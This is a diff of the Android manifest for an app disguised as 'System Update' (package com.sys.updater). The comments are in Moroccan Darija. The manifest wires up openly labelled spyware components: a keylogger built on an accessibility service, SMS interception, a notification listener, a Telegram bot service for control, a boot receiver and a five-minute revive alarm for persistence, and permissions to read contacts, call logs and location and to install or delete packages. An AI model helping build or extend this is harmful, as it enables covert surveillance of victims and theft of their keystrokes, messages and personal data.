@@ -2,6 +2,7 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     package="com.sys.updater">
 
+    <!-- Permissions L'Asasiyin -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.SEND_SMS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
@@ -14,14 +15,23 @@
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.READ_CALL_LOG" />
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+    <uses-permission android:name="android.permission.VIBRATE" />
+
+    <!-- Permissions L'Jdad li khassk tzid -->
+    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" /> <!-- Bach ykhdem /backup -->
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" /> <!-- Bach ykhdem l'Persistence -->
+    <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
+    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
-    <uses-permission android:name="android.permission.SET_WALLPAPER" />
-    <uses-permission android:name="android.permission.REQUEST_DELETE_PACKAGES" />
 
     <application
         android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher" 
         android:label="System Update"
         android:theme="@style/Theme.AppCompat.Light.NoActionBar">
 
@@ -45,6 +55,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- Accessibility Service (Keylogger) -->
         <service
             android:name=".KeyloggerService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -57,6 +68,7 @@
                 android:resource="@xml/accessibility_service_config" />
         </service>
 
+        <!-- SMS Receiver -->
         <receiver
             android:name=".SmsReceiver"
             android:exported="true"
@@ -66,6 +78,7 @@
             </intent-filter>
         </receiver>
 
+        <!-- Boot Receiver (Persistence) -->
         <receiver
             android:name=".BootReceiver"
             android:exported="true">
@@ -75,31 +88,35 @@
             </intent-filter>
         </receiver>
 
+        <!-- Revive Receiver (Kol 5 dqayq) -->
+        <receiver android:name=".ReviveReceiver" android:exported="false" />
+
+        <!-- Telegram Bot Service -->
         <service
             android:name=".TelegramService"
             android:foregroundServiceType="dataSync"
             android:exported="false" />
+
+        <!-- Notification Listener -->
         <service
-    android:name=".NotifListenerService"
-    android:exported="true"
-    android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
-    <intent-filter>
-        <action android:name="android.service.notification.NotificationListenerService" />
-    </intent-filter>
-</service>
+            android:name=".NotifListenerService"
+            android:exported="true"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+        </service>
 
-        <!-- F l'<application> tag, zid -->
-<receiver android:name=".ReviveReceiver" android:exported="false" />
+        <!-- FileProvider (Fix l'APK Install) -->
+        <provider
+            android:name="androidx.core.content.FileProvider"
+            android:authorities="${applicationId}.fileprovider"
+            android:exported="false"
+            android:grantUriPermissions="true">
+            <meta-data
+                android:name="android.support.FILE_PROVIDER_PATHS"
+                android:resource="@xml/file_paths" />
+        </provider>
 
-<!-- Ila knti f ZArchiver, FileProvider authority bdelha l "ru.zdevs.zarchiver.fileprovider" -->
-<provider
-    android:name="androidx.core.content.FileProvider"
-    android:authorities="${applicationId}.fileprovider"
-    android:exported="false"
-    android:grantUriPermissions="true">
-    <meta-data
-        android:name="android.support.FILE_PROVIDER_PATHS"
-        android:resource="@xml/file_paths" />
-</provider>
     </application>
 </manifest>
